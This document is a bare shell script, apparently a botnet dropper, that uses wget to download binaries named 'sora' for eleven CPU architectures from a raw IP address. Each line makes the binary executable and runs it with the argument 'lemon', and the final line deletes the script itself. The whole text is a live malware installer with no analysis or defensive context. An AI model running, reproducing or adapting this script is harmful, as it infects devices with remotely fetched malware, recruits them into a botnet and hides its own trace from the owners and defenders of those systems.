wget http://37.0.10.182/bins/sora.arm; chmod 777 sora.arm; ./sora.arm lemon
wget http://37.0.10.182/bins/sora.arm5; chmod 777 sora.arm5; ./sora.arm5 lemon
wget http://37.0.10.182/bins/sora.arm6; chmod 777 sora.arm6; ./sora.arm6 lemon
wget http://37.0.10.182/bins/sora.arm7; chmod 777 sora.arm7; ./sora.arm7 lemon
wget http://37.0.10.182/bins/sora.sh4; chmod 777 sora.sh4; ./sora.sh4 lemon
wget http://37.0.10.182/bins/sora.arc; chmod 777 sora.arc; ./sora.arc lemon
wget http://37.0.10.182/bins/sora.mips; chmod 777 sora.mips; ./sora.mips lemon
wget http://37.0.10.182/bins/sora.mipsel; chmod 777 sora.mipsel; ./sora.mipsel lemon
wget http://37.0.10.182/bins/sora.sparc; chmod 777 sora.sparc; ./sora.sparc lemon
wget http://37.0.10.182/bins/sora.x86_64; chmod 777 sora.x86_64; ./sora.x86_64 lemon
wget http://37.0.10.182/bins/sora.i586; chmod 777 sora.i586; ./sora.i586 lemon

rm $0